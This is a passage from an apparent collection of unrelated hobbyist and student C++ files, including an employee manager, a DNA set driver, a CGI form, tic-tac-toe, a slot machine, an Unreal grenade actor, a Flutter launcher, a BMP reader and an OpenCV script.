employees.begin(); it != employees.end(); ++it) {\n        if (it->surname == surname) {\n            employees.erase(it);\n            cout << \"\u00d1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea \u00f3\u00e4\u00e0\u00eb\u00e5\u00ed.\\n\";\n            return;\n        }\n    }\n    cout << \"\u00d1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea \u00f1 \u00f4\u00e0\u00ec\u00e8\u00eb\u00e8\u00e5\u00e9 \" << surname << \" \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed.\\n\";\n}\n\nvoid sortBySurname(vector<Employee>& employees) {\n    setlocale(LC_ALL, \"Russian\");\n    sort(employees.begin(), employees.end(), [](const Employee& a, const Employee& b) {\n        return a.surname < b.surname;\n        });\n    cout << \"\u00d1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00e8 \u00ee\u00f2\u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00fb \u00ef\u00ee \u00f4\u00e0\u00ec\u00e8\u00eb\u00e8\u00e8.\\n\";\n}\n\nint main() {\n    setlocale(LC_ALL, \"Russian\");\n    vector<Employee> employees;\n    string filename = \"employees.txt\";\n    int choice;\n\n    do {\n        displayMenu();\n        cin >> choice;\n        switch (choice) {\n        case 1:\n            loadFromFile(employees, filename);\n            break;\n        case 2:\n            saveToFile(employees, filename);\n            break",
    "/**********************************************************************\n// File name:\t DNASetDriver.cpp\n// Author:\t\t Bryant Hayden\n// Date:\n// Class:\t\t\t CS 250\n// Assignment: DNAStrandSet\n// Purpose:\t\t Driver for assignment\n**********************************************************************/\n#include \"DNAStrandSet.h\"\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n\nvoid printMessage (const string& message, ostream& rcOutStream);\n\nusing namespace std;\n\nint main () {\n\tconst string INPUT1 = \"dnastrands1.txt\";\n\tconst string INPUT2 = \"dnastrands2.txt\";\n\n\tifstream inFile;\n\n\tDNAStrandSet cSet1;\n\tDNAStrandSet cSet2;\n\n\tDNAStrand::FLAG flag1;\n\tDNAStrand::FLAG flag2;\n\n\t//read 1\n\tinFile.open (INPUT1);\n\n\tif (inFile.fail ()) {\n\t\tcout << \"ERROR OPENING INPUT FILE\";\n\t\texit (EXIT_FAILURE);\n\t}\n\n\tflag1 = cSet1.read (inFile);\n\n\tif (DNAStrand::FLAG::LEGAL > flag1) {\n\t\tcout << \"Illegal DNAStrand Input\" << endl;\n\t\texit (EXIT_FAILURE);\n\t}\n\tinFile.close ();\n\t//end\n\n\t//Read 2\n\tinFile.open (INPUT2);\n\n\tif (inFile.fail ()) {\n\t\tcout << \"FILE ERROR\";\n\t\texit (EXIT_FAILURE);\n\t}\n\n\tflag2 = cSet2.read (inFile);\n\n\tif (DNAStrand::FLAG::LEGAL > flag2) {\n\t\tcout << \"Illegal DNAStrand Input\" << endl;\n\t\texit (EXIT_FAILURE);\n\t}\n\tinFile.close ();\n\t//end\n\n\tcout << \"*** DNAStrandSet Analyzer ***\" << endl;\n\n\tprintMessage (\"DNAStrandSet #1\", cout);\n\tcSet1.write (cout);\n\n\tprintMessage (\"DNAStrandSet #2\", cout);\n\tcSet2.write (cout);\n\n\tprintMessage (\"Set Union\", cout);\n\tcSet1.setUnion (cSet2).write (cout);\n\n\tprintMessage (\"Set Intersection\", cout);\n\tcSet1.setIntersection (cSet2).write (cout);\n\n\treturn EXIT_SUCCESS;\n}\n\nvoid printMessage (const string& message, ostream& rcOutStream) {\n\trcOutStream << endl << message << endl << setfill ('-')\n\t\t<< setw (message.length ()) << \"\" << endl;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main() {\r\n    // Required for CGI scripting\r\n    cout << \"Content-type:text/html\\n\\n\";\r\n    \r\n    // HTML with JavaScript and form\r\n    cout << \"<html>\";\r\n    cout << \"<head>\";\r\n    cout << \"<title>User Form</title>\";\r\n    \r\n    // Adding JavaScript \r\n    cout << \"<script>\";\r\n    cout << \"function displayCredentials() {\";\r\n    \r\n    // Get values from form inputs\r\n    cout << \"  var name = document.getElementById('name').value;\";\r\n    cout << \"  var age = document.getElementById('age').value;\";\r\n    cout << \"  var email = document.getElementById('email').value;\";\r\n    \r\n    // Display user-entered values\r\n    cout << \"  document.getElementById('result').innerHTML = \"\r\n            \"'<h2>Submitted Data</h2>' +\"\r\n            \"'<p>Name: ' + name + '</p>' +\"\r\n            \"'<p>Age: ' + age + '</p>' +\"\r\n            \"'<p>Email: ' + email + '</p>';\";\r\n    \r\n    cout << \"  return false;\";  // Prevent form submission\r\n    cout << \"}\";\r\n    cout << \"</script>\";\r\n    \r\n    cout << \"</head>\";\r\n    cout << \"<body>\";\r\n    \r\n    // Displaying the form\r\n    cout << \"<h1>Enter your details</h1>\";\r\n    cout << \"<form onsubmit='return displayCredentials()'>\"; // JavaScript handles the form submission\r\n    cout << \"Name: <input type='text' id='name' name='name'><br>\";\r\n    cout << \"Age: <input type='number' id='age' name='age'><br>\";\r\n    cout << \"Email: <input type='email' id='email' name='email'><br>\";\r\n    cout << \"<input type='submit' value='Submit'>\";\r\n    cout << \"</form>\";\r\n    \r\n    // Placeholder to display result\r\n    cout << \"<div id='result'></div>\";\r\n    \r\n    cout << \"</body>\";\r\n    cout << \"</html>\";\r\n    \r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\r\n#include<stdio.h>\r\n#include<stdlib.h>\r\n#include <graphics.h>\r\nusing namespace std;\r\n\r\nvoid design()\r\n{\r\n    settextstyle(10,0,6);\r\n    int w=textwidth(\"Tic Tac Toe\");\r\n    outtextxy((400-w)/2,80,\"Tic Tac Toe\");\r\n\tline(160,220,160,460);\r\n\tline(160+1,220,160+1,460);\r\n\tline(160-1,220,160-1,460);\r\n\r\n\tline(80,300,320,300);\r\n\tline(80,300+1,320,300+1);\r\n\tline(80,300-1,320,300-1);\r\n\r\n\tline(80,380,320,380);\r\n\tline(80,380+1,320,380+1);\r\n\tline(80,380-1,320,380-1);\r\n\r\n\tline(240,220,240,460);\r\n\tline(240+1,220,240+1,460);\r\n\tline(240-1,220,240-1,460);\r\n\r\n    settextstyle(10,0,2);\r\n    int h=textheight(\"By Shivam\");\r\n    w=textwidth(\"By Shivam\");\r\n    outtextxy(400-w-5,600-h,\"By Shivam\");\r\n}\r\n\r\nvoid dis(int turn, int p)\r\n{\r\n    settextstyle(10,0,6);\r\n    int w=0,h=0;\r\n    if(turn==1){\r\n        h=textheight(\"X\");\r\n        w=textwidth(\"X\");\r\n    }\r\n    else{\r\n        h=textheight(\"O\");\r\n        w=textwidth(\"O\");\r\n    }\r\n    int x=(80-w)/2;\r\n    int y=(80-h)/2;\r\n    switch(p)\r\n    {\r\n        case 1:\r\n            if(turn==1)\r\n                outtextxy(x+80,y+220,\"X\");\r\n            else\r\n                outtextxy(x+80,y+220,\"O\");\r\n            break;\r\n        case 2:\r\n            if(turn==1)\r\n                outtextxy(x+160,y+220,\"X\");\r\n            else\r\n                outtextxy(x+160,y+220,\"O\");\r\n            break;\r\n        case 3:\r\n            if(turn==1)\r\n                outtextxy(x+240,y+220,\"X\");\r\n            else\r\n                outtextxy(x+240,y+220,\"O\");\r\n            break;\r\n        case 4:\r\n            if(turn==1)\r\n                outtextxy(x+80,y+300,\"X\");\r\n            else\r\n                outtextxy(x+80,y+300,\"O\");\r\n            break;\r\n        case 5:\r\n            if(turn==1)\r\n                outtextxy(x+160,y+300,\"X\");\r\n            else\r\n                outtextxy(x+160,y+300,\"O\");\r\n            break;\r\n        case 6:\r\n            if(turn==1)\r\n                outtextxy(x+240,y+300,\"X\");\r\n            else\r\n                outtextxy(x+240,y+300,\"O\");\r\n            break;\r\n        case 7:\r\n            if(turn==1)\r\n                outtextxy(x+80,y+380,\"X\");\r\n            else\r\n                outtextxy(x+80,y+380,\"O\");\r\n            break;\r\n        case 8:\r\n            if(turn==1)\r\n                outtextxy(x+160,y+380,\"X\");\r\n            else\r\n                outtextxy(x+160,y+380,\"O\");\r\n            break;\r\n        case 9:\r\n            if(turn==1)\r\n                outtextxy(x+240,y+380,\"X\");\r\n            else\r\n                outtextxy(x+240,y+380,\"O\");\r\n            break;\r\n\r\n    }\r\n\r\n\r\n}\r\n\r\nint fun(char *a){\r\n    // return || 0 for no result || 1 for player 1 || 2 for player 2\r\n\r\n    //diagonal check\r\n    if((a[0]==a[4] && a[0]==a[8] && a[0]=='X') || (a[2]==a[4] && a[2]==a[6] && a[2]=='X'))\r\n        return 1;\r\n    else if((a[0]==a[4] && a[0]==a[8] && a[0]=='O') || (a[2]==a[4] && a[2]==a[6] && a[2]=='O'))\r\n        return 2;\r\n\r\n    // horizontal check\r\n    if((a[0]==a[1] && a[1]==a[2] && a[0]=='X') || (a[3]==a[4] && a[4]==a[5] && a[3]=='X') || (a[6]==a[7] && a[7]==a[8] && a[6]=='X'))\r\n        return 1;\r\n    else if((a[0]==a[1] && a[1]==a[2] && a[0]=='O') || (a[3]==a[4] && a[4]==a[5] && a[3]=='O') || (a[6]==a[7] && a[7]==a[8] && a[6]=='O'))\r\n        return 2;\r\n\r\n    //vertical check\r\n    if((a[0]==a[3] && a[3]==a[6] && a[0]=='X') || (a[1]==a[4] && a[4]==a[7] && a[1]=='X') || (a[2]==a[5] && a[5]==a[8] && a[2]=='X'))\r\n        return 1;\r\n    if((a[0]==a[3] && a[3]==a[6] && a[0]=='O') || (a[1]==a[4] && a[4]==a[7] && a[1]=='O') || (a[2]==a[5] && a[5]==a[8] && a[2]=='O'))\r\n        return 2;\r\n    return 0;\r\n}\r\n\r\nvoid computer(char *a,int turn){\r\n    int cnt[8],p[8];\r\n    for(int i=0;i<8;i++){\r\n        cnt[i]=0;p[i]=-1;\r\n    }\r\n    // attack\r\n    for(int i=0;i<9;i++){\r\n        if(a[i]=='O'){\r\n            cnt[i/3]++;\r\n            cnt[3+i%3]++;\r\n            if(i%4==0)\r\n                cnt[6]++;\r\n            if(i==2 || i==4 || i==6)\r\n                cnt[7]++;\r\n        }\r\n        else if(a[i]==0){\r\n            p[i/3]=i;\r\n            p[3+i%3]=i;\r\n            if(i%4==0)\r\n                p[6]=i;\r\n            if(i==2 || i==4 || i==6)\r\n                p[7]=i;\r\n        }\r\n    }\r\n    for(int i=0;i<8;i++){\r\n        if(cnt[i]==2 && p[i]!=-1){\r\n            dis(0,p[i]+1);\r\n            a[p[i]]='O';\r\n            return;\r\n        }\r\n        p[i]=-1;cnt[i]=0;\r\n    }\r\n    // defend\r\n    for(int i=0;i<9;i++){\r\n        if(a[i]=='X'){\r\n            cnt[i/3]++;\r\n            cnt[3+i%3]++;\r\n            if(i%4==0)\r\n                cnt[6]++;\r\n            if(i==2 || i==4 || i==6)\r\n                cnt[7]++;\r\n        }\r\n        else if(a[i]==0){\r\n            p[i/3]=i;\r\n            p[3+i%3]=i;\r\n            if(i%4==0)\r\n                p[6]=i;\r\n            if(i==2 || i==4 || i==6)\r\n                p[7]=i;\r\n        }\r\n    }\r\n    for(int i=0;i<8;i++){\r\n        if(cnt[i]==2 && p[i]!=-1){\r\n            dis(0,p[i]+1);\r\n            a[p[i]]='O';\r\n            return;\r\n        }\r\n        p[i]=-1;cnt[i]=0;\r\n    }\r\n    if(a[4]==0){\r\n        dis(0,5);\r\n     ",
    "#define hly \"\\033[3;43;30m\"\n#define hlg \"\\033[3;42;30m\"\n#define fin \"\\033[0m\"\n#include <iostream>\n#include <fstream>\n#include <string>\n#include \"slot.cpp\"\nusing namespace std;\nofstream fout(\"debug.out\");\nstruct item{\n    string item_string;\n    bool start_hl = false, stop_hl = false;\n}a[4][6];\nint credit = 5;\nint bet = 5;\nint ai,aj;\nint main(int argc, char *argv[]){\n    cout << \"|\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e|\\n\";\n    srand((unsigned) time(NULL));\n\n    for(int i = 1; i <= 3; i++){\n        for(int j = 1; j <= 5; j++){\n            a[i][j].item_string = slot_random_item();\n        }\n    }\n    a[1][5].stop_hl = true;\n    a[2][5].stop_hl = true;\n    a[3][5].stop_hl = true;\n    for(int i = 1; i <= 3; i++){\n        for(int j = 2; j <= 5; j++){\n            if(a[i][j].item_string != \"\ud83d\ude1e\" && a[i][j].item_string == a[i][j-1].item_string){\n                a[i][j-1].start_hl = true;\n            }else{\n                if(j >= 3){\n                    if(a[i][j-1].item_string != a[i][j].item_string){\n                        a[i][j-1].stop_hl = true;\n                    }\n                }\n            }\n        }\n    }\n    for(int i = 1; i <= 3; i++){\n        cout << \"| \";\n        int no_of_items = 1;\n        for(int j = 1; j <= 5; j++){\n            if(a[i][j].start_hl){\n                cout << hly;\n            }\n            cout << a[i][j].item_string;\n            if(a[i][j].stop_hl){\n                if(a[i][j].item_string == \"\ud83c\udf52\"){\n                    cout << no_of_items;\n                    switch(no_of_items){\n                        case 2:\n                            credit += bet/5;\n                            fout << '\\n' << bet/5;\n                        case 3:\n                            credit += bet/2;\n                            fout << '\\n' << bet/2;    \n                        case 4:\n                            credit += bet;\n                            fout << '\\n' << bet;\n                        case 5:\n                            credit += bet*2;\n                            fout << '\\n' <<bet*2;\n                    }\n                }\n                no_of_items = 0;\n                cout << fin;\n            }\n            no_of_items++;\n            cout << ' ';\n        }\n        cout << \" |\\n\";\n    }\n    cout << \"|5 50 100 500 \" << hlg << \"1000\" << fin << \"|\\n\";\n    cout << \"|CREDIT: \"<< credit << \"|\\n\";\n    cout << \"|\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e\u203e|\\n\";\n    cout << \"|                 |\\n\";\n    cout << \"|                 |\\n\";\n    cout << \"|_________________|\\n\";\n}",
    "// Copyright 2024 Tony Sze\r\n\r\n#include \"Grenade.h\"\r\n#include \"GameFramework/Character.h\"\r\n#include \"Components/CapsuleComponent.h\"\r\n#include \"Kismet/KismetMathLibrary.h\"\r\n#include \"Kismet/GameplayStatics.h\"\r\n#include \"Sound/SoundCue.h\"\r\n#include \"Components/AudioComponent.h\"\r\n#include \"NiagaraComponent.h\"\r\n#include \"NiagaraFunctionLibrary.h\" \r\n#include \"PhysicsEngine/RadialForceComponent.h\"\r\n\r\nAGrenade::AGrenade()\r\n{\r\n\t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\r\n\tPrimaryActorTick.bCanEverTick = false;\r\n\r\n\tCapsuleComponent = CreateDefaultSubobject<UCapsuleComponent>(TEXT(\"Capsule Collider\"));\r\n\tGrenadeMeshComponent = CreateDefaultSubobject<USkeletalMeshComponent>(TEXT(\"Grenade Mesh Component\"));\r\n\tGrenadeAudioComponent = CreateDefaultSubobject<UAudioComponent>(TEXT(\"Grenade Audio Component\"));\r\n\tRadialForceComponent = CreateDefaultSubobject<URadialForceComponent>(TEXT(\"Radial Force Component\"));\r\n\r\n\tRootComponent = CapsuleComponent;\r\n\tGrenadeMeshComponent->AttachToComponent(CapsuleComponent, FAttachmentTransformRules::KeepRelativeTransform);\r\n\tGrenadeAudioComponent->AttachToComponent(CapsuleComponent, FAttachmentTransformRules::KeepRelativeTransform);\r\n\tRadialForceComponent->AttachToComponent(CapsuleComponent, FAttachmentTransformRules::KeepRelativeTransform);\r\n}\r\n\r\nvoid AGrenade::BeginPlay()\r\n{\r\n\tSuper::BeginPlay();\r\n\r\n\tTags.Add(FName(\"Grenade\"));\r\n\r\n\tFuseTimeRemaining = FuseTime;\r\n\r\n\tif (GrenadeAudioComponent)\r\n\t{\r\n\t\tGrenadeAudioComponent->bAutoActivate = false;\r\n\t}\r\n\r\n\tif (CapsuleComponent)\r\n\t{\r\n\t\tCapsuleComponent->OnComponentHit.AddDynamic(this, &AGrenade::OnGrenadeHitObject);\r\n\t}\r\n}\r\n\r\nvoid AGrenade::PullPin(ACharacter* OwnerCharacter, bool PlayPinAudio)\r\n{\r\n\tif (!bIsPinPulled)\r\n\t{\r\n\t\tif (PlayPinAudio)\r\n\t\t{\r\n\t\t\tPlaySound(PinPullSound);\r\n\t\t}\r\n\r\n\t\tGrenadeOwner = OwnerCharacter;\r\n\t\tbIsPinPulled = true;\r\n\r\n\t\tFTimerHandle FuseTimerHandle;\r\n\t\tGetWorldTimerManager().SetTimer(FuseTimerHandle, this, &AGrenade::Explode, FuseTime, false);\r\n\t}\r\n}\r\n\r\nvoid AGrenade::PopLever()\r\n{\r\n\tPlaySound(LeverPopSound);\r\n}\r\n\r\nvoid AGrenade::ReleaseGrenade(FVector& AimDirection)\r\n{\r\n\tif (CapsuleComponent)\r\n\t{\r\n\t\tCapsuleComponent->DetachFromComponent(FDetachmentTransformRules::KeepWorldTransform);\r\n\t\tEnablePhysics();\r\n\t}\r\n\r\n\tLaunchGrenade(AimDirection);\r\n\r\n\tif (TrailEffect)\r\n\t{\r\n\t\tUNiagaraFunctionLibrary::SpawnSystemAttached(TrailEffect, \r\n\t\t\t\t\t\t\t     GrenadeMeshComponent, \r\n\t\t\t\t\t\t\t     NAME_None, \r\n\t\t\t\t\t\t\t     FVector::ZeroVector, \r\n\t\t\t\t\t\t\t     FRotator::ZeroRotator, \r\n\t\t\t\t\t\t\t     EAttachLocation::SnapToTargetIncludingScale, \r\n\t\t\t\t\t\t\t     true, \r\n\t\t\t\t\t\t\t     true);\r\n\t}\r\n}\r\n\r\nbool AGrenade::GetIsPinPulled()\r\n{\r\n\treturn bIsPinPulled;\r\n}\r\n\r\nbool AGrenade::GetIsReleased()\r\n{\r\n\treturn bIsReleased;\r\n}\r\n\r\nfloat AGrenade::GetFuseTimeRemaining()\r\n{\r\n\treturn FuseTimeRemaining;\r\n}\r\n\r\nACharacter* AGrenade::GetOwnerCharacter()\r\n{\r\n\treturn GrenadeOwner;\r\n}\r\n\r\nvoid AGrenade::OnGrenadeHitObject(UPrimitiveComponent* HitComp, AActor* OtherActor, UPrimitiveComponent* OtherComp, FVector NormalImpulse, const FHitResult& Hit)\r\n{\r\n\tif (LastActorHit != OtherActor && !OtherActor->ActorHasTag(FName(\"Grenade\")))\r\n\t{\r\n\t\tPlaySound(BounceSound);\r\n\r\n\t\t// Register the previous hit actor to avoid audio spam in case of fast/small bounces on the same surface\r\n\t\tLastActorHit = OtherActor;\r\n\t}\r\n}\r\n\r\nvoid AGrenade::EnablePhysics()\r\n{\r\n\tif (CapsuleComponent)\r\n\t{\r\n\t\tCapsuleComponent->SetSimulatePhysics(true);\r\n\t\tCapsuleComponent->SetCollisionEnabled(ECollisionEnabled::QueryAndPhysics);\r\n\t}\r\n}\r\n\r\nvoid AGrenade::DisablePhysics()\r\n{\r\n\tif (CapsuleComponent)\r\n\t{\r\n\t\tCapsuleComponent->SetSimulatePhysics(false);\r\n\t\tCapsuleComponent->SetCollisionEnabled(ECollisionEnabled::NoCollision);\r\n\t}\r\n}\r\n\r\nvoid AGrenade::LaunchGrenade(FVector& AimDirection)\r\n{\r\n\tif (CapsuleComponent)\r\n\t{\r\n\t\tCapsuleComponent->SetPhysicsLinearVelocity(FVector::ZeroVector);\r\n\t\tCapsuleComponent->SetAllPhysicsLinearVelocity(AimDirection * ThrowForceMultiplier);\r\n\t}\r\n\r\n\tbIsReleased = true;\r\n}\r\n\r\nvoid AGrenade::Explode()\r\n{\r\n\tif (GrenadeMeshComponent)\r\n\t{\r\n\t\tGrenadeMeshComponent->SetVisibility(false, true);\r\n\t}\r\n\r\n\tDisablePhysics();\r\n\r\n\tPlaySound(ExplosionSound);\r\n\r\n\tFVector ActorLocation = GetActorLocation();\r\n\r\n\tif (ExplosionEffect)\r\n\t{\r\n\t\tUNiagaraFunctionLibrary::SpawnSystemAtLocation(GetWorld(), ExplosionEffect, ActorLocation, FRotator::ZeroRotator);\r\n\t}\r\n\r\n\tFireImpulse();\r\n\r\n\tPerformRadialDamage(ActorLocation);\r\n\r\n\tDrawExplosionDecal(ActorLocation);\r\n\r\n\tSpawnChildGrenades();\r\n\r\n\tTimedCleanup(3.0f);\r\n}\r\n\r\n// Impulse parameters set in Radial Force Component in editor, separate from grenade damage parameters\r\nvoid AGrenade::FireImpulse()\r\n{\r\n\tif (RadialForceComponent)\r\n\t{\r\n\t\tRadialForceComponent->FireImpulse();\r\n\t}\r\n}\r\n\r\nvoid AGrenade::PerformRadialDamage(FVector& Origin)\r\n{\r\n\tTArray<AActor*> ActorsToIgnore;\r\n\tActorsToIgnore.Init(this, 1);\r\n\r\n\tUGameplayStatics::ApplyRadialDamageWithFalloff(GetWorld(), \r\n\t\t\t\t\t\t       MaximumDamage, \r\n\t\t\t\t\t\t  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dicee_flutter_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <windows.h>\n\nclass BMPReader \n{\nprivate:\n    BITMAPFILEHEADER fileHeader;\n    BITMAPINFOHEADER infoHeader;\n    unsigned char* pixelData = nullptr;\n    int width, height;\n    std::ifstream file;\n\npublic:\n\n    BMPReader()\n    {\n        // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f fileHeader\n        fileHeader.bfType = 0x4D42;  // 'BM' \u0432 ASCII\n        fileHeader.bfSize = 0;\n        fileHeader.bfReserved1 = 0;\n        fileHeader.bfReserved2 = 0;\n        fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);\n\n        // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f infoHeader\n        infoHeader.biSize = sizeof(BITMAPINFOHEADER);\n        infoHeader.biWidth = 0;\n        infoHeader.biHeight = 0;\n        infoHeader.biPlanes = 1;\n        infoHeader.biBitCount = 24;\n        infoHeader.biCompression = BI_RGB;\n        infoHeader.biSizeImage = 0;\n        infoHeader.biXPelsPerMeter = 0;\n        infoHeader.biYPelsPerMeter = 0;\n        infoHeader.biClrUsed = 0;\n        infoHeader.biClrImportant = 0;\n\n        width = 0;\n        height = 0;\n    }\n\n    // \u041e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 BMP \u0444\u0430\u0439\u043b\u0430\n    bool openBMP(const std::string& fileName) \n    {\n        file.open(fileName, std::ios::binary);\n        if (!file.is_open()) \n        {\n            std::cerr << \"Error opening file!\" << std::endl;\n            return false;\n        }\n\n        // \u0427\u0442\u0435\u043d\u0438\u0435 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u043e\u0432\n        file.read(reinterpret_cast<char*>(&fileHeader), sizeof(BITMAPFILEHEADER));\n        file.read(reinterpret_cast<char*>(&infoHeader), sizeof(BITMAPINFOHEADER));\n\n        // BMP (24 \u0438\u043b\u0438 32 \u0431\u0438\u0442\u0430 \u043d\u0430 \u043f\u0438\u043a\u0441\u0435\u043b\u044c)\n        if (fileHeader.bfType != 0x4D42 || (infoHeader.biBitCount != 24 && infoHeader.biBitCount != 32)) \n        {\n            std::cerr << \"Unsupported BMP format!\" << std::endl;\n            return false;\n        }\n\n        width = infoHeader.biWidth;\n        height = infoHeader.biHeight;\n\n        std::cout << \"Size: \" << fileHeader.bfSize << \". Resolution: \" << width << \"x\" << height << std::endl;\n\n\n        // \u0412\u044b\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438 \u0434\u043b\u044f \u043f\u0438\u043a\u0441\u0435\u043b\u044c\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445\n        int pixelDataSize = infoHeader.biSizeImage ? infoHeader.biSizeImage : (width * height * infoHeader.biBitCount / 8);\n        pixelData = new unsigned char[pixelDataSize];\n\n        // \u041f\u0435\u0440\u0435\u0445\u043e\u0434 \u043a \u043f\u0438\u043a\u0441\u0435\u043b\u044c\u043d\u044b\u043c \u0434\u0430\u043d\u043d\u044b\u043c \u0438 \u0438\u0445 \u0447\u0442\u0435\u043d\u0438\u0435\n        file.seekg(fileHeader.bfOffBits, std::ios::beg);\n        file.read(reinterpret_cast<char*>(pixelData), pixelDataSize);\n\n        return true;\n    }\n\n    // \u0412\u044b\u0432\u043e\u0434 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c\n    void displayBMP() {\n        if (!pixelData) return;\n\n        int bytesPerPixel = infoHeader.biBitCount / 8;\n\n        // BMP \u0445\u0440\u0430\u043d\u0438\u0442 \u043f\u0438\u043a\u0441\u0435\u043b\u0438 \u0432 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\u043c \u043f\u043e\u0440\u044f\u0434\u043a\u0435 \u043f\u043e \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u0438, \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0441 \u043a\u043e\u043d\u0446\u0430\n        for (int y = height - 1; y >= 0; --y) \n        {\n            for (int x = 0; x < width; ++x) \n            {\n                unsigned char* pixel = pixelData + (y * width + x) * bytesPerPixel;\n                unsigned char blue = pixel[0];\n                unsigned char green = pixel[1];\n                unsigned char red = pixel[2];\n\n                // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u044c \u0447\u0435\u0440\u043d\u044b\u043c (RGB 0,0,0) \u0438\u043b\u0438 \u0431\u0435\u043b\u044b\u043c (RGB 255,255,255)\n                if (red == 0 && green == 0 && blue == 0) \n                {\n                    std::cout << \"#\";  // \u0427\u0435\u0440\u043d\u044b\u0439 \u043f\u0438\u043a\u0441\u0435\u043b\u044c\n                }\n                else if (red == 255 && green == 255 && blue == 255) \n                {\n                    std::cout << \" \";  // \u0411\u0435\u043b\u044b\u0439 \u043f\u0438\u043a\u0441\u0435\u043b\u044c\n                }\n                else \n                {\n                    std::cout << \"?\";  // \u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0439 \u0446\u0432\u0435\u0442\n                }\n            }\n            std::cout << std::endl;  // \u041f\u0435\u0440\u0435\u0445\u043e\u0434 \u043d\u0430 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443\n        }\n    }\n\n    // \u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0438 \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438\n    void closeBMP() \n    {\n        if (file.is_open()) \n        {\n            file.close();\n        }\n        delete[] pixelData;\n        pixelData = nullptr;\n    }\n\n    ~BMPReader() \n    {\n        closeBMP();  // \u041e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u0440\u0435\u0441\u0443\u0440\u0441\u043e\u0432 \u043f\u0440\u0438 \u0443\u043d\u0438\u0447\u0442\u043e\u0436\u0435\u043d\u0438\u0438 \u043e\u0431\u044a\u0435\u043a\u0442\u0430\n    }\n};\n\nint main(int argc, char* argv[]) \n{\n    if (argc != 2) \n    {\n        std::cerr << \"Usage: drawBmp.exe <path_to_bmp>\" << std::endl;\n        return 1;\n    }\n\n\n    BMPReader bmp;\n    if (bmp.openBMP(argv[1])) \n    {\n        bmp.displayBMP();\n        bmp.closeBMP();\n    }\n\n    return 0;\n}\n",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n\nint main() {\n    // \u8bfb\u53d6\u5f69\u8272\u56fe\u50cf\n    cv::Mat image = cv::imread(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/test_image.png\");\n    if (image.empty()) {\n        std::cerr << \"Error: Unable to open image file!\" << std::endl;\n        return -1;\n    }\n\n    // \u8f6c\u6362\u4e3a HSV \u56fe\u50cf\n    cv::Mat hsvImage;\n    cv::cvtColor(image, hsvImage, cv::COLOR_BGR2HSV);\n\n    // \u4fdd\u5b58\u6216\u663e\u793a HSV \u56fe\u50cf\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/hsv_image.jpg\", hsvImage)) {\n        std::cerr << \"Error: Unable to save HSV image!\" << std::endl;\n        return -1;\n    }\n    cv::imshow(\"HSV Image\", hsvImage);\n\n    // \u5b9a\u4e49\u7ea2\u8272\u7684 